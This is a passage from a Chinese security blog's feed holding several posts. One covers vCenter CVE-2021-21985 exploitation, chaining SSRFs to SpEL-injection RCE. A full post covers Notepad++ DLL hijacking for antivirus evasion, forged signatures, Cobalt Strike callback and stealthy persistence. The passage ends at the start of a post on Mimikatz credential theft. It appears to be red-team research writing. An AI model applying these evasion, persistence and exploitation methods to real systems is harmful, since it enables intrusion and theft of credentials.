src="/img/vcenterldfx_s.png"></p><p><code>vmodPackage</code>参数传递过程中通过<code>getContextFileNameForPackage</code>加载<code>/context.xml</code>，并通过其重载方法将<code>.</code>替换为<code>/</code>，xml内容中不能用标准IP和域名，可以用十进制型IP绕过。但这样依然是反向远程加载xml文件，不出网的环境就会很蛋疼，所以现在要解决的问题是如何通过正向访问将恶意xml送进去。可以想到通过<a href="https://en.wikipedia.org/wiki/Data_URI_scheme">data协议</a>传入base64编码的xml数据，可是Java的URL类默认只支持http、https、file、jar。</p><p><img src="/img/vcenterldfx_q.png"></p><p>Java不行！Python行！位于<code>/usr/lib/vmware-vpx/vsan-health/pyMoVsan/</code>的<code>VsanHttpProvider.py</code>存在一个未授权访问SSRF，匹配<code>vsanHealth/vum/driverOfflineBundle/</code>的请求内容，由urlopen发包并zip解压匹配返回<code>*offline_bundle.*</code>文件内容。<code>/etc/hosts</code>的存在也能帮助绕过<code>.</code>的限制，算是锦上添花了。</p><p><img src="/img/vcenterldfx_r.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /etc/hosts</span></span><br><span class="line"><span class="comment"># Begin /etc/hosts (network card version)</span></span><br><span class="line"></span><br><span class="line">127.0.0.1   localhost.localdomain</span><br><span class="line">127.0.0.1localhost</span><br><span class="line">127.0.0.1photon-machine</span><br><span class="line"><span class="comment"># End /etc/hosts (network card version)</span></span><br></pre></td></tr></table></figure><p>现在就只剩下最后一个问题就是如何拿到命令执行的回显，rr的解决方案是发现可以调用到<code>systemProperties</code>的<code>getProperty</code>方法拿到属性，所以执行命令时只需将结果由<code>system.setProperty</code>存入再读出。也可以利用方法执行时的报错将执行结果带出。</p><ul><li>System类有一个本质为Hashtable的Properties类型的props静态成员变量，单个JVM实例共享，不同JVM实例隔离</li></ul><p>总结一下该漏洞可以调用环境中任意类静态方法，比较直接的就是通过JNDI加载远程恶意方法，进一步能够写入和重命名任意文件通过JNI加载so中的native方法，也可以利用Java中的SSRF套娃Python的SSRF实现SpEL注入RCE。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://vdc-download.vmware.com/vmwb-repository/dcr-public/f7ffd9f7-9f92-444c-9529-40913be95870/e6f15e3b-361a-4dac-83e8-d0a4e8b83d0b/vsphere-client-sdk-671-local-programming-guide.pdf">Creating and Deploying Plug-In Packages</a></p><p><a href="https://docs.spring.io/spring-framework/docs/current/reference/html/core.html">Spring Framework Documentation</a></p><p><a href="https://twitter.com/ptswarm/status/1316016337550938122">File Read</a></p><p><a href="https://www.vmware.com/security/advisories/VMSA-2021-0002.html">VMSA-2021-0002</a></p><p><a href="https://swarm.ptsecurity.com/unauth-rce-vmware/">Unauthorized RCE in VMware vCenter</a></p><p><a href="https://0x20h.com/p/7cb6.html">CVE-2021-21972 复现和分析</a></p><p><a href="https://www.vmware.com/security/advisories/VMSA-2021-0010.html">VMSA-2021-0010</a></p><p><a href="https://www.iswin.org/2021/06/02/Vcenter-Server-CVE-2021-21985-RCE-PAYLOAD/">Vcenter Server CVE-2021-21985 RCE PAYLOAD</a></p><p><a href="https://testbnull.medium.com/a-quick-look-at-cve-2021-21985-vcenter-pre-auth-rce-9ecd459150a5">A Quick Look at CVE-2021–21985 VCenter Pre-Auth RCE</a></p><p><a href="http://noahblog.360.cn/vcenter-cve-2021-2021-21985/">VCSA 6.5-7.0 远程代码执行 CVE-2021-21985 漏洞分析</a></p><p><a href="https://cangqingzhe.github.io/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Vcenter漏洞分析</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基础设施&quot;&gt;&lt;a href=&quot;#基础设施&quot; class=&quot;headerlink&quot; title=&quot;基础设施&quot;&gt;&lt;/a&gt;基础设施&lt;/h2&gt;&lt;p&gt;vSphere Client分为UI层、Java服务层、后端层，前端通过RESTful API与基于Spring MVC和O</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="JNDI" scheme="https://hosch3n.github.io/tags/JNDI/"/>
    
    <category term="SSRF" scheme="https://hosch3n.github.io/tags/SSRF/"/>
    
    <category term="ESXI" scheme="https://hosch3n.github.io/tags/ESXI/"/>
    
    <category term="VCSA" scheme="https://hosch3n.github.io/tags/VCSA/"/>
    
    <category term="JNI" scheme="https://hosch3n.github.io/tags/JNI/"/>
    
    <category term="SpEL" scheme="https://hosch3n.github.io/tags/SpEL/"/>
    
    <category term="CVE-2021-21972" scheme="https://hosch3n.github.io/tags/CVE-2021-21972/"/>
    
    <category term="CVE-2021-21985" scheme="https://hosch3n.github.io/tags/CVE-2021-21985/"/>
    
  </entry>
  
  <entry>
    <title>利用dll劫持实现免杀与维权</title>
    <link href="https://hosch3n.github.io/2021/06/29/%E5%88%A9%E7%94%A8dll%E5%8A%AB%E6%8C%81%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80%E4%B8%8E%E7%BB%B4%E6%9D%83/"/>
    <id>https://hosch3n.github.io/2021/06/29/%E5%88%A9%E7%94%A8dll%E5%8A%AB%E6%8C%81%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80%E4%B8%8E%E7%BB%B4%E6%9D%83/</id>
    <published>2021-06-29T08:29:02.000Z</published>
    <updated>2021-07-01T13:17:57.881Z</updated>
    
    <content type="html"><![CDATA[<p>根据软件工程高内聚低耦合的思想，把程序要重复使用的代码封装成函数/类方法，将软件要重复使用的程序封装成链接库。库分为静态链接库和动态链接库，静态链接库顾名思义就是在程序链接阶段打包进文件中，而动态链接库则是在程序运行时再导入调用。动态链接库有着加载时复用节省内存、补丁更新时可符合开闭原则等优点，也有容易发生版本冲突、容易被劫持等缺点。Windows平台下的动态链接库常为dll文件，linux则常为so文件。</p><h2 id="dll劫持概念与类型"><a href="#dll劫持概念与类型" class="headerlink" title="dll劫持概念与类型"></a>dll劫持概念与类型</h2><p>dll劫持就是要想方设法地调用到恶意dll。为了便于理解，需要了解一下目前Windows默认的dll调用顺序：</p><p><img src="/img/lydllhj_a.png"></p><ul><li><em><code>Known DLL</code></em> 特指 定义在<code>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code>中且只能在System目录中加载的dll们</li></ul><p>由此可以引出几种dll劫持的形式：</p><ol><li><p>直接将恶意dll暴力替换掉正常dll，软件正常功能会受影响</p></li><li><p>将恶意dll作为中间人，转发调用正常dll的导出函数，同时加入额外的恶意操作</p></li><li><p>利用加载顺序的机制，让恶意dll先于正常dll加载</p></li><li><p>利用软件本身缺失的dll加载恶意dll</p></li><li><p>更改环境变量或是.exe.manifest/.exe.local文件实现dll重定向</p></li></ol><ul><li>如果利用低权限劫持的dll文件，会被高权限程序加载运行，就是一个权限提升漏洞</li></ul><h2 id="找dll劫持的一种方法"><a href="#找dll劫持的一种方法" class="headerlink" title="找dll劫持的一种方法"></a>找dll劫持的一种方法</h2><p>通过 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">Process Monitor</a> 监控dll调用是一种最基础的寻找dll劫持的方式，在filter中添加<code>Path ends with .dll</code>和<code>Result is NAME NOT FOUND</code>规则，并且可以加上<code>Process Name contains xxx</code>来针对性的找xxx的dll劫持。</p><p><img src="/img/lydllhj_b.png"></p><p>编写一个加载dll的demo，让它加载一个不存在的dll，可以监控到加载的路径顺序（请无视中文路径乱码Orz）。如果这是一个真实的常用软件，则可以用来实现上文中的第4种劫持。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hModule = LoadLibrary(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (hModule) &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Load Success\n&quot;</span>);</span><br><span class="line">        FreeLibrary(hModule);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Load Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/lydllhj_c.png"></p><h2 id="劫持notepad-的dll"><a href="#劫持notepad-的dll" class="headerlink" title="劫持notepad++的dll"></a>劫持notepad++的dll</h2><p>下面以notepad++为例，实现上文中的第2种劫持，这类dll转发利用<code>#pragma comment(linker, &quot;/EXPORT:xxx,@y)</code>可以很方便地实现。</p><p>出于免杀上线以及权限维持的考虑，我们物色一下尽量符合这些特点的dll：</p><ol><li><p>后台进程稳定不挂，避免主进程退出导致dll一起挂了</p></li><li><p>容易触发上线，行为隐蔽不易被杀软和人工发现</p></li></ol><p>然后我看到了会被 <code>updater/GUP.exe</code> 拉起的 <code>libcurl.dll</code>，以及安装版中存在且可方便地附加到绿色版中的 <code>NppShell_06.dll</code>。前者是一个软件更新组件，后者是Windows右键中<code>Edit with Notepad++</code>的组件，会随explorer.exe加载且不会重复执行，只要在文件上按右键就会触发（并不需要点击它，看到时就已经加载了dll）：</p><p><img src="/img/lydllhj_d.png"></p><p>由于 <code>GUP.exe</code> 容易退出，需要让它加到常驻服务里去，我们优先看看 <code>NppShell_06.dll</code>。这是一个会随安装包的<code>Context Menu Enty</code>选项一起安装到软件目录的dll，通过 Process Monitor 监控并筛选注册表，发现有如下变动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_CLASSES_ROOT\CLSID\&#123;B298D29A-A6ED-11DE-BA8C-A68E55D89593&#125;]</span><br><span class="line">@&#x3D;&quot;ANotepad++64&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\CLSID\&#123;B298D29A-A6ED-11DE-BA8C-A68E55D89593&#125;\InprocServer32]</span><br><span class="line">@&#x3D;&quot;C:\\Program Files\\Notepad++\\NppShell_06.dll&quot;</span><br><span class="line">&quot;ThreadingModel&quot;&#x3D;&quot;Apartment&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\CLSID\&#123;B298D29A-A6ED-11DE-BA8C-A68E55D89593&#125;\Settings]</span><br><span class="line">&quot;Title&quot;&#x3D;&quot;Edit with &amp;Notepad++&quot;</span><br><span class="line">&quot;Path&quot;&#x3D;&quot;C:\\Program Files\\Notepad++\\notepad++.exe&quot;</span><br><span class="line">&quot;Custom&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;ShowIcon&quot;&#x3D;dword:00000001</span><br><span class="line">&quot;Dynamic&quot;&#x3D;dword:00000001</span><br><span class="line">&quot;Maxtext&quot;&#x3D;dword:00000019</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\*\shellex\ContextMenuHandlers\ANotepad++64]</span><br><span class="line">@&#x3D;&quot;&#123;B298D29A-A6ED-11DE-BA8C-A68E55D89593&#125;&quot;</span><br></pre></td></tr></table></figure><p>也就是说只需要将安装文件中的 <code>NppShell_06.dll</code> 拷贝到绿色版文件中，并将上述变动导入注册表就可以手动实现添加右键打开的功能，不过该操作需要管理员权限。</p><ul><li><code>regedit /s nppi.reg</code></li></ul><p>构造了还不错的触发条件后，接下来将原dll更名为 <code>NppShell_05.dll</code>、找出导出函数，在我们的恶意dll中按顺序转发原函数调用并附加恶意操作（比如加载shellcode），目前已经有很多成熟的工具可以帮助找出这些导出函数们：</p><p><img src="/img/lydllhj_e.png"></p><ul><li>开始调试时为了避免干扰因素，通常不会直接上shellcode而是用MessageBox弹窗做试验</li></ul><h2 id="免杀与权限维持"><a href="#免杀与权限维持" class="headerlink" title="免杀与权限维持"></a>免杀与权限维持</h2><p>将恶意dll的shellcode简单处理一下后再伪造一个原dll的签名，此时就是正常签名程序-&gt;伪造签名的dll-&gt;正常签名的dll，测试了几款主流杀软和defender，可以挺人畜无害地上线CS：</p><p><img src="/img/lydllhj_f.png"></p><p><img src="/img/lydllhj_g.png"></p><p><img src="/img/lydllhj_h.png"></p><p>对于权限维持而言，恶意dll会在第一次导入注册表操作时加载，之后可由任意文件上右键的行为被explore进程拉起，不会在任务管理器中看到恶意进程，也没有类似于开机自启这种敏感行为。而且有意思的是管理员会因为右键用杀软扫描文件的行为而上线2333</p><hr><p>这是Web狗学习Windows的一点小测试记录，希望师傅们能分享更多好玩的tricks鸭～</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#standard-search-order-for-desktop-applications">Dynamic-Link Library Search Order</a></p><p><a href="https://itm4n.github.io/windows-dll-hijacking-clarified/">Windows DLL Hijacking (Hopefully) Clarified</a></p><p><a href="https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows">Hijacking DLLs in Windows</a></p><p><a href="https://www.netspi.com/blog/technical/adversary-simulation/adaptive-dll-hijacking/">Adaptive DLL Hijacking</a></p><p><a href="https://printempw.github.io/add-notepad-plus-plus-to-context-menu/">添加 Notepad++ 至右键菜单的几种方法</a></p><p><a href="https://www.anquanke.com/post/id/232891">DLL劫持之权限维持篇（二）</a></p><p><a href="https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html">shellcode加载总结</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;根据软件工程高内聚低耦合的思想，把程序要重复使用的代码封装成函数/类方法，将软件要重复使用的程序封装成链接库。库分为静态链接库和动态链接库，静态链接库顾名思义就是在程序链接阶段打包进文件中，而动态链接库则是在程序运行时再导入调用。动态链接库有着加载时复用节省内存、补丁更新时</summary>
      
    
    
    
    <category term="红蓝对抗" scheme="https://hosch3n.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="dll" scheme="https://hosch3n.github.io/tags/dll/"/>
    
    <category term="hijack" scheme="https://hosch3n.github.io/tags/hijack/"/>
    
  </entry>
  
  <entry>
    <title>CS破解与二次开发</title>
    <link href="https://hosch3n.github.io/2021/05/29/CS%E7%A0%B4%E8%A7%A3%E4%B8%8E%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"/>
    <id>https://hosch3n.github.io/2021/05/29/CS%E7%A0%B4%E8%A7%A3%E4%B8%8E%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/</id>
    <published>2021-05-29T12:57:09.000Z</published>
    <updated>2022-07-23T07:47:35.252Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a6234b37afacf693c6e6343313b8ca1b302697454c42c1dddee2ff02ab321830">3dd7a577bfd713cc67cfcedc3d382df5f1dc5c271982282fd5f4cdefcb2b4f3c02d992e46defdbe1de98a8399ad1c17fb0c807a226746d767a25d63b24cde844ecad2861b619995e2df157a72dbe813fcf152de89843791fd60f57bfa0f2fdf5efb438cbff892e262c413bcf4082c2ff3c54c87e113125b8c75f9589d2943a9eb2526a8c529362389d455fad418a66e7657f15db2f0714b1b07e14e08353a8c6e9687752880a6e997544c0b433b29916d326d0111bf1e7ea5f8241506337efba7a12fca5d1ca70f92c986a1c3d116e5b9e03d9ff07b81fd25640c543148e566370b16592fa8b8a526636ad1f5cdb7f344899f871b549ea350cb7fdfce10024d5016ee0b893848f53973c6f5bcad234b0c968f1782108dd8288998b56fcfe04d607a2ff4fdd810f8f56ba2c02a5f1f6becc4250a5716262306a0d6e3366030a6e6e48d184eaf8793f0632853bb97d6618cb1213a99863cc34139268b8bf1028da683dfa8d43f49d114e1cb0c95b2b54d701b99ae9e175f0d24804723398ef7983f9fd6200c0b862ec914767f551e4d370cafbfb559f3460e258229258daeb7ab30296bff080afa998c62ada443ae83779d6b082cca44512ad23848683d8f3ecd4713589a7569b53b0795fa6d81ff118282df1d83f7147233f172df3278a3880218b85dc564f4c00c0b3d1187158b32747f72a4ced55e3a70b1213b4457160905ea1d278e0beb379ce434f31d57b80f9e8ab660a201e52016fb22dc73eee551c5735e2d0ed6603399b65b85bad17746a322d56fb18f47c2b45e6f922e7cb550b805989c414a1b3866e498981faf01896d5a346f3b923286d37f5b89a3723a6c89ec55018367921703a8e0e1d7b69e006ea6c30e809c06bb1510babac7febbed2b5463a33ef0d242deb28fe9eecfc3a9d727cc7f22f1dd80424ad4c64c8e3d2016a1ded8f91135ecf89d09c05622936c527a612a32f643b1860240d4f316f4113fec1e19195937690cb592aaa31fb788fbf524d986c878aab95a6727e23b4ab1a63fc15b78eeee59fa2357c6710907f0cddf4a9c93f90ca6bcdb23c66b9943e25fe93333da9a14e41229c69ce9c359a57b1ef379ce92ca5ae8ff8cb52a50e29844d3849450068ad8b00705f626f36bdb09c16e8fa6efc43981832b61123a194034d10b930454e3f33cfd36e9f7be86822188eb37b35f87340615749950eaed26c05b47296e8064805ba66cf7b36fb4eccf16c96cde00c38a67008ffb22f6ce8b571a9a56898c7d7a07f138057c893e422595440791f9764ffaaecbbbf8336aca0b356f920274700830bfc7c8e94843acda02ac0e09278128c3bb1f1db3a7c420438b3070542a3e225f1c718ed13be7940be881c93668e4b2c99547bf7b2a1dcfc6a451a83185be80fe589e39708cbf0ccfedfd34e8157905171c7dffd8ba3a9b9654718284afa0e9993ef70f3043aa0b463d2bd22ff12d9e9cad9674b7a9ee3d8b86ad06a682ff814725eb89ecbc7958c99003333e39d9c50d6d97f4ae4567804acc31da8cc45431113033bee677b93b0c30b400e2a5f55dd6e8c37994532b204f035b828c3d53136faab99b092e03e15e2961162e43a01f7eb2b3fea2643596a6b72f0d52067cafd300dca088919a95ca5beac6ecc2ebb3ef59793716c744af20daa33c24eebf36c0e678e4e730c16937a23319c245ced00d5c9db6f97490f2c11e98f3a3bc3afc5a266306214f99090b26bd58b51e02c1ba02b1bf400df0b88cd58430d8f75966e5d572c9e027542d80af3ea15c7c9986606eb1238f20a9459eca431ea360430e6bd70b18abf5756cd147656656f1a8c67b5afe858258ba92ac981da381e84dc3a0513b7a21a58cffddbd2c427af3c6cd4b02c24f1964a4098aaa0deb0775c088d053ee705c8f15bb7a6eaaed356bcf2fec233d983aaa81f28ec4d708a314afacee0b87acb5344d7dd64e9266be0dc4fea1aef04c5ad38c4d30b950470346a786d120fb3c0e2369bd07970681e686ff7c1c0810edd252cdc8298c26ec1c6e6de666e89d68f758a1b54952eb177733cb2a90cce09bb2514349c23954b9a4caa5696f4c20eb24b9ee3bbdd66f9bbb6bf2b16223a2cbab3e049a96a4bd01e8cafee5b5aff08b03959693793e015edc7d6c694615b0a6378190e64e9794ba09f42db4592265c984e266d52bba012253547e3299b2fe6033b62e2c459ef9a5c08e7bed155279d2e5c2bf2fb503ed8b4f6194d0c28171e4e44f63b1c7300653f99ec5da163fbd5b56f2c9ac0323b681ec93d3aac309eb1f78153782f9022f0bac4718e82ae8844dfce6636da5879195da2dc28f1e5f993856e05587b06ed6af317c12c8e9207f2e18cd2544e84f2306cdeee4ebb04cd958fc7ad3ac199271de5ee76a857bd71bf91ab5e749b7e3480d75db39167632e4565f4ddfdbbaf7649d323e41f49852439ac0838f4ec2cfe29f2211737cdb77aa04101c7c6649758908e83de4da240112e48d85f4a72261709f348ad4553e38b8e1797645faea200c39ea0c9144a900eef8d8dc4aa5a6b02c375df8336455bf58a54086b9ea90e22603ea435800a089542516af93bdd2dc36d79fce7191f048792028cf92db34d89c875320ecbde0029b6de9704140f26db337633fae0123170942b17a2178a62cd33cf18a5f192df46787664cfea1ae3d9ca5561a6de374d16fba01baec44fdccd5b2d12395940626262f94bca129ecd36bd0923e34c83239a40c25303c7f4a2ef2f7444c1d524b424b03afd5d0e709690b847c9179aa49b8a29da60563507e54fab6ae2b64535c3d5d742c567635d16a641afbc244536f86145216c4b266b5b5a0c2c136fc665eb4f61c82499dae28faafb6048395436b7bd1389d8eeb021f7a8870b23b116fc1bbbc92ea97fe33330845b99f774c28b7f655244d12aa3226f3650ca40dede931820c6cfdf8f793fef80d9c915f487fefe02f79f57272773d893cc73bffbfb59894ad4a003fb40f6679314173d9b9715f38de9fa0da83bba9728a1a8326a9af6f1aa35cb07612e893d533ff5b6452ddc184c657a99aff72fdc5ed9442fb841602919b7ffaf8ce9e7c73f5066d83f9aae3d130ea99cca729a06075264a541d3c9f333176c4bea991176e6110a6f81c3f76b62ebc2cc9ca5b78437068ed38aa610fc96d636491a90b334274d74f26606b06e5d5254b579eb05f3ca81c6baa1a94fff033f72afddf56a1f8de6d90e4cc8d7a148c8d31c60c961f652d30350049f4bd1b60e45867459637fe1f553201d6889de6c23a31764bd4570b65f9db4919bdc376ba5fe933482b856d43ba42358c830485016ea7b97920f0b3ac728370722c79f129c918fdf136cc00d6357879f631a07d52b95c2220743a1020e9e21f6f528ee93184efecd896112bd7e0d9e4751907518944a3907e371bfa0a0a4b33441aa3cd304ce25737c0bbb1b2ee432ac8ec8240a46ca1a3f4daa8a063a515cc323054a4356cd5b602d49d52cecc7ceb807ca7523df0c9894d77dd3de54e1b1b34ce3259687bfd51bd57f0928964f3c5b95a9c7cf73a45d72a4af4f74d16ba35f52159bb179564a1209698af9723ba19d4bf994ac039c1d5c9396c749cddf2db40a2f24d088a77cc1b4dd8a33d9be537d616c38e2267caaddddebbd135de7b813b4545122693b52dd2aba4cc00505478fc6796b32bfa7b8e2e71c0ec7efa370c47bbf486eacc023f58714f557e813a568c45531100b41aea816c840b8965c67f2ff9d43874508b25be77418b24e541e50b1c8582f8f1cd4893448dbdd2fb3d2a16c380a07753a3d1dc7e475df9b2aa2f300f893e0551d12809507b404827c5817f4a8194b9cfd9e7cba85344889785fc2ca4e52dcb99edd723e42a083012523dbe4254bb702d62816865194113ea8ebbe7347fe505d27e14953382917ed9f6aecbc7f33d18947c809c4f41b2b0d2dcf5312a149911617f0b25ca11e210aa993fe4dfbbbc2bd2bad1806eb718fc1b9440d60d84ee8903a318f4503dad7e2b77593302a9088b8c59b02356529cf4d6663ff06d6d6b6e948c214ac9ac27f3d2f819ec945949cd2e165719c03a5c179aed8afa4a3adff17b24d0d6f9e1692d4b7233477056dc4a45a1a668c2897d0bbefdb2c5523d19ba818a2c4e389140597ea1c6d26f07854c6db0255fdf1836355078e0d3a086f29902ae771096000acf800f613b739e7023afa38185ad0fced308dc42f50065275186619bd8d69ca9f36782efbb67c92d7bdda3f6d9f1c45afd3740e2ea630d66e4c3760514c7f675dfd987fa62592a64a4c6c2905cc4cb7b8e4c910d0627d87ae88431d985124627bd96c56ad7b7a28071694371a22d7fe14b77a0ef1750d7c3e4dfadafebea33bb9d1e786d16262ac8c479752a6feff9fd55b1a67f54409d7e6bcc71d4ac6d0e5630638f171fbcd4440fb7f981249e9759360aa04938596d084688733354b261ae339d34fa82cd34a55f45b60636bf7a309c9e6b5ec43d11cc04bbf4a7da469837a7dcc0763510e39efea82613330a2bf9bfb03c6fd24ad80ad76a594cbf05ac5754c8bbe4eca808e90ef503b8f09cd337775ede6511c144269acc996533f7083d8e3e8e32505519e61c26774fc0808663ff009a0bcd0020166aa1874de7903fb6586ef07d7c21c4c665433dc1f1cab75105eb418d53ca9101a5564121315da271c7e9403cf33fac57919025276d9aa0c4bdde301f5342bd9aa986267b0cbcbba7710683c735f0319a677f0a7ded9ee15f35534d98b0d8428f89e20410fce5b502ed832bc18a750732b6b9f5d6a09643abf1010166d98ec2eae2f6e470c3b09c705b9262b145b286f77c6fc0381cd18936bb2ba0c7c269daa38463b5d035bbd8bfa6ee934648a31d140bc7a2c3464f64d66bfd617de366c61dbbe423553799c01f0c62ca6c8ad1a71b32e7a5c2517052dcad9045dd93a4f69de3650126b785929fa0e4a130746c85ba41bc5083061db0a800ec08643f3b6067debd8e315dc30066879d8759a576dd849db89206c6040b94a623500fdc327440866c7d8c273a20832a338b303b3aded4e31fe2d4b26f268c50e508160e70cef875088e928933bd1ef48c897f5076a8a9bc87cf1a7bbbc308c580e8d08c4627bc356144d132aff8b8edbc6d3d623b8586a33ffffb8c05e4ec6e2e86499ff58f0349d823f562223c091067f192bb2d4c9b36b6bb007b744280bc3d1aa09f368970b7510dbd8ae095a349c18cfc11df2484873f550b278bd45b2cce9921ffbbfbfb5e056535c1b7f533441927d1c799db8c789d634b531ab35519695f0db6f97296b4eb35d8e558a7c579427dec2232db648b30356e509a3fb6a9247d35ec0a7f58152828a5c214d62133193aecb7aaa77eac6cd01584169a988aa7f01746785c97f63bbbb22eaab61d11361e4aa33862927c4f506775267dda8f6b4b1cd1c09a8c2387aadab6817d51a2ed0a9755816bbb788af702f1c7f80c6853d9010721a2ac4ae166fc5bbcff0a75176d36c1d37b36f12aaf6235aaa1349d590d3926bd6f93e79f152a17104d5a5d876bf79cf7808d86bdcc84682eeecad79a42bfd8794f3fc86c4b8d4ef3a1984e4604ef7fa95bcc0e580b878894ce5967718a1c567fdeeea49ce551636b71409956fee67484384cef15250a869323ea3f2d9751033d102fabad6eb73bf75df3f2ebea4ed3dc013cca6ff22a822e7b84a4ebaf0c93754d712ecae15f8a2f3610cb9c34bcc75dcb0de8fc5a7916ff830f79dc8a49933f90280ab343e4b6521f7dfaffe089654a9d64596152f827d4ce0be269c4bcf9eb8231323aade9f5ef72db71619659d012cff368abf58614017f13615de2d8abe31e0db4a6c241ac97c6f70f641e8577237a5917cc21cf97221320dd817cbb5be3b320810a64f5c251def2b135c1cda51d841abc64e3e83380aa49da418720097d0b3f6ad3270649a07cb5f4b5ef0a731ad43840f38bb4c27fb09db723825218158ecdc1143c382b8b9600d6e20a53aa6c306611318fae0d93bf627f5d89085c3504017301f2be863399f8e531928ea3ef023ee0e0ecdc13247de7343d3da6157b072673bc20fefaa4616</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="IDEA" scheme="https://hosch3n.github.io/tags/IDEA/"/>
    
    <category term="jar" scheme="https://hosch3n.github.io/tags/jar/"/>
    
    <category term="RSA" scheme="https://hosch3n.github.io/tags/RSA/"/>
    
    <category term="AES" scheme="https://hosch3n.github.io/tags/AES/"/>
    
    <category term="HMAC" scheme="https://hosch3n.github.io/tags/HMAC/"/>
    
  </entry>
  
  <entry>
    <title>Windows凭据窃取（一）</title>
    <link href="https://hosch3n.github.io/2021/03/10/Windows%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://hosch3n.github.io/2021/03/10/Windows%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-03-10T15:48:05.000Z</published>
    <updated>2022-05-11T08:06:05.979Z</updated>
    
    <content type="html"><![CDATA[<p><em>管中窥豹，可见一斑。Windows密钥窃取防护与绕过技术的背后，是红蓝对抗大环境的更新迭代。–hosch3n瞎编的</em> </p><h2 id="Mimikatz非交互执行"><a href="#Mimikatz非交互执行" class="headerlink" title="Mimikatz非交互执行"></a>Mimikatz非交互执行</h2><p>在很久很久以前，通过<code>高卢神器Mimikatz</code>扒Windows的系统密码，就已经是横向移动的标配手段之一。那时候，运维对 AV / EDR / IDS / IPS 还没什么概念，更不用提威胁情报、欺骗防御了。于是只要找个论坛下载原封不动编译好的猕猴桃，远程桌面连上去就能扒下更多的账户密码。</p><p>可能有同学要怼我了，你密码都不知道怎么连远程桌面扒密码？前辈们其实也遇到了这个问题，所以除了RDP密码泄漏这种途径，常常会先添加一个伪装成机器用户的管理员：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td 